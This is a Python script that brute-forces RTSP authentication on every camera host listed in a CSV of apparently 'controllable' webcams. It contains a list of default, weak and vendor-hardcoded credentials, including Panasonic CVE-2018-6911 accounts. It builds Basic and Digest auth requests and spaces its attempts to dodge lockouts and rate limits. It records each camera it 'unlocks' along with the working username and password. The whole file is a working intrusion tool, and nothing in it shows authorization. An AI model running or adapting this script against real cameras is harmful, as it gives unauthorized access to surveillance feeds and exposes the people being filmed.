"""Broad RTSP brute force across all RTSP cams in master CSV.

Tests extended credential list against all RTSP cams, with longer cooldowns
to avoid server-side rate limits.
"""

import os
import sys
import csv
import json
import time
import socket
import re
import hashlib
import secrets
import concurrent.futures

WORKDIR = r"C:\Users\eli6-admin\Documents\eli6-surveillance"
MASTER_CSV = os.path.join(WORKDIR, "controllable_Webcams.csv")
BF_RESULTS = os.path.join(WORKDIR, "camera_testing", "rtsp_bf_v2_results.json")
PROGRESS_PATH = os.path.join(WORKDIR, "camera_testing", "rtsp_bf_v2_progress.json")

# Extended credentials (60+ combos)
EXTENDED_CREDS = [
    # Basic admin defaults
    ("admin", "admin"),
    ("admin", "12345"),
    ("admin", "1234"),
    ("admin", "123"),
    ("admin", "123456"),
    ("admin", "1234567890"),
    ("admin", "password"),
    ("admin", ""),
    ("admin", "camera"),
    ("admin", "VB"),
    ("admin", "canon"),
    ("admin", "Canon"),
    ("admin", "i-pro"),
    ("admin", "admin12345"),
    # Root accounts
    ("root", "root"),
    ("root", ""),
    ("root", "pass"),
    ("root", "admin"),
    ("root", "12345"),
    # User/guest/operator
    ("user", "user"),
    ("user", ""),
    ("guest", "guest"),
    ("operator", "operator"),
    # Panasonic BB-HCM hardcoded (CVE-2018-6911)
    ("admin1", "12345"),
    ("admin2", "12345"),
    ("admin1", ""),
    ("admin2", ""),
    # Hidden accounts
    ("admin1", "admin"),
    ("admin2", "admin"),
    ("admin3", ""),
    ("setup", ""),
    ("setup", "setup"),
    # Viewer accounts
    ("viewer", ""),
    ("viewer", "viewer"),
    ("viewer1", ""),
    ("viewer1", "viewer"),
    # Service/maintenance
    ("service", "service"),
    ("maintenance", ""),
    ("maintenance", "admin"),
    # i-PRO defaults
    ("admin", "ipro"),
    ("admin", "merit"),
    # AXIS defaults
    ("root", "pass"),
    # Hikvision defaults
    ("admin", "hik12345"),
    # Dahua defaults
    ("admin", "admin123"),
    # Bosch defaults
    ("service", "service"),
    # Sony defaults
    ("admin", "admin1234"),
    # PTZ defaults
    ("ptz", "ptz"),
    ("ptz", ""),
    # URL-decoded
    ("admin", "%00"),
    ("admin", "0000"),
    ("admin", "9999"),
    # Common weak
    ("admin", "changeme"),
    ("admin", "default"),
    ("admin", "P@ssw0rd"),
    ("admin", "Admin123"),
    ("admin", "abc123"),
    ("admin", "qwerty"),
    ("admin", "letmein"),
    ("admin", "welcome"),
    ("admin", "passw0rd"),
    ("admin", "administrator"),
    ("admin", "system"),
    ("admin", "manager"),
    ("admin", "netcam"),
    ("admin", "private"),
    ("admin", "security"),
    ("admin", "super"),
    ("admin", "supervisor"),
]


def load_progress():
    if os.path.exists(PROGRESS_PATH):
        try:
            with open(PROGRESS_PATH, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            pass
    return {"tested": {}, "unlocked": 0}


def save_progress(p):
    try:
        tmp = PROGRESS_PATH + ".tmp"
        with open(tmp, "w", encoding="utf-8") as f:
            json.dump(p, f)
        os.replace(tmp, PROGRESS_PATH)
    except Exception:
        pass


def load_results():
    if os.path.exists(BF_RESULTS):
        try:
            with open(BF_RESULTS, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            pass
    return {}


def save_results(r):
    try:
        tmp = BF_RESULTS + ".tmp"
        with open(tmp, "w", encoding="utf-8") as f:
            json.dump(r, f, indent=2)
        os.replace(tmp, BF_RESULTS)
    except Exception:
        pass


def md5(s):
    return hashlib.md5(s.encode()).hexdigest()


def get_challenge(host, port, path='/stream1', timeout=4):
    """Send DESCRIBE and get the WWW-Authenticate challenge."""
    try:
        sock = socket.create_connection((host, port), timeout=timeout)
        req = f'DESCRIBE rtsp://{host}:{port}{path} RTSP/1.0\r\nCSeq: 1\r\nUser-Agent: Mozilla/5.0\r\n\r\n'
        sock.send(req.encode())
        data = b''
        sock.settimeout(timeout)
        try:
            while b'\r\n\r\n' not in data and len(data) < 5000:
                d = sock.recv(1024)
                if not d:
                    break
                data += d
        except socket.timeout:
            pass
        sock.close()
        if b'401' not in data[:100]:
            # No auth required (or 200 OK)
            return None
        m = re.search(rb'WWW-Authenticate:\s*(\w+)\s+(.+)', data)
        if not m:
            return None
        scheme = m.group(1).decode()
        params_str = m.group(2).decode()
        params = {}
        for match in re.finditer(r'(\w+)="?([^",]+)"?', params_str):
            params[match.group(1)] = match.group(2)
        return {"scheme": scheme, "params": params}
    except Exception:
        pass
    return None


def try_basic(host, port, path, user, pw, timeout=4):
    """Try RTSP with HTTP Basic Auth."""
    try:
        import base64
        creds = base64.b64encode(f"{user}:{pw}".encode()).decode()
        sock = socket.create_connection((host, port), timeout=timeout)
        req = f'DESCRIBE rtsp://{host}:{port}{path} RTSP/1.0\r\nCSeq: 1\r\nAuthorization: Basic {creds}\r\nUser-Agent: Mozilla/5.0\r\n\r\n'
        sock.send(req.encode())
        data = b''
        sock.settimeout(timeout)
        try:
            while b'\r\n\r\n' not in data and len(data) < 5000:
                d = sock.recv(1024)
                if not d:
                    break
                data += d
        except socket.timeout:
            pass
        sock.close()
        if b'RTSP/1.0 200' in data:
            return True
    except Exception:
        pass
    return False


def try_digest(host, port, path, user, pw, realm, nonce, timeout=4):
    """Try RTSP with Digest Auth."""
    try:
        ha1 = md5(f"{user}:{realm}:{pw}")
        ha2 = md5(f"DESCRIBE:rtsp://{host}:{port}{path}")
        nc = "00000001"
        cnonce = secrets.token_hex(8)
        response = md5(f"{ha1}:{nonce}:{nc}:{cnonce}:auth:{ha2}")
        auth = (
            f'Digest username="{user}", realm="{realm}", '
            f'nonce="{nonce}", uri="rtsp://{host}:{port}{path}", '
            f'algorithm=MD5, qop=auth, nc={nc}, cnonce="{cnonce}", '
            f'response="{response}"'
        )
        sock = socket.create_connection((host, port), timeout=timeout)
        req = f'DESCRIBE rtsp://{host}:{port}{path} RTSP/1.0\r\nCSeq: 2\r\nAuthorization: {auth}\r\nUser-Agent: Mozilla/5.0\r\n\r\n'
        sock.send(req.encode())
        data = b''
        # Use longer timeout for digest to allow nonce refresh
        sock.settimeout(timeout)
        try:
            while b'\r\n\r\n' not in data and len(data) < 5000:
                d = sock.recv(1024)
                if not d:
                    break
                data += d
        except socket.timeout:
            pass
        sock.close()
        if b'RTSP/1.0 200' in data:
            return True
    except Exception:
        pass
    return False


def bf_one(host_port, progress):
    """Test all creds against one host with cooldown between attempts."""
    host, port = host_port
    key = f"{host}:{port}"
    if key in progress.get("tested", {}):
        return None
    progress.setdefault("tested", {})[key] = True

    # Get auth challenge
    challenge = get_challenge(host, port)
    if not challenge:
        return None  # No RTSP server or no auth required

    scheme = challenge["scheme"]
    realm = challenge["params"].get("realm", "User")
    nonce = challenge["params"].get("nonce", "")

    # Use cooldown - 0.5s between attempts to avoid lockout
    for user, pw in EXTENDED_CREDS:
        if not user:
            continue
        try:
            success = False
            if scheme.lower() == "basic":
                success = try_basic(host, port, '/stream1', user, pw)
            elif scheme.lower() == "digest":
                success = try_digest(host, port, '/stream1', user, pw, realm, nonce)
            if success:
                return {
                    "host": host,
                    "port": port,
                    "user": user,
                    "pass": pw,
                    "scheme": scheme,
                    "realm": realm,
                    "evidence": f"Auth bypass: {user}:{pw} via {scheme}",
                }
            time.sleep(0.5)  # Cooldown between attempts
        except Exception:
            time.sleep(1)
            continue
    return None


def main():
    print(f"[RTSP BF v2] Loading {MASTER_CSV}")
    csv.field_size_limit(2**31 - 1)
    with open(MASTER_CSV, "r", encoding="utf-8", errors="replace", newline="") as f:
        rows = list(csv.DictReader(f))

    # Find all RTSP cams
    targets = set()
    for row in rows:
        url = row.get("url", "")
        live_url = row.get("live_stream_url", "")
        for u in [url, live_url]:
            if "rtsp://" in u:
                m = re.search(r'rtsp://([^:/]+):?(\d+)?', u)
                if m:
                    host = m.group(1)
                    port = int(m.group(2)) if m.group(2) else 554
                    targets.add((host, port))
                    break

    targets = sorted(targets)
    print(f"[RTSP BF v2] {len(targets)} unique RTSP hosts")

    progress = load_progress()
    results = load_results()

    todo = []
    for host, port in targets:
        key = f"{host}:{port}"
        if key not in progress.get("tested", {}):
            todo.append((host, port))

    print(f"[RTSP BF v2] {len(todo)} hosts to test")
    print(f"[RTSP BF v2] {len(EXTENDED_CREDS)} creds per host = ~{len(EXTENDED_CREDS) * 0.5:.0f}s per host")

    if not todo:
        print("[RTSP BF v2] Nothing to do.")
        return

    unlocked = 0
    completed = 0
    start = time.time()

    with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
        futures = {executor.submit(bf_one, (h, p), progress): (h, p) for h, p in todo}
        for fut in concurrent.futures.as_completed(futures):
            try:
                result = fut.result(timeout=600)
            except Exception:
                result = None
            completed += 1
            if result:
                key = f"{result['host']}:{result['port']}"
                results[key] = result
                unlocked += 1
                progress["unlocked"] = progress.get("unlocked", 0) + 1
                print(f"  [{completed}/{len(todo)}] UNLOCKED: {key} via {result['scheme']} {result['user']}:{result['pass']}")
            else:
                tp = futures[fut]
                print(f"  [{completed}/{len(todo)}] failed: {tp[0]}:{tp[1]}", end="\r")
            if completed % 3 == 0:
                save_progress(progress)
                save_results(results)
                elapsed = time.time() - start
                rate = completed / max(elapsed, 1)
                eta = (len(todo) - completed) / max(rate, 0.01)
                print(f"\n  Progress: {completed}/{len(todo)}, unlocked {unlocked}, {rate:.2f}/s, ETA: {eta:.0f}s")

    save_progress(progress)
    save_results(results)
    print(f"\n[RTSP BF v2] Done. Unlocked {unlocked}/{len(todo)}.")


if __name__ == "__main__":
    main()
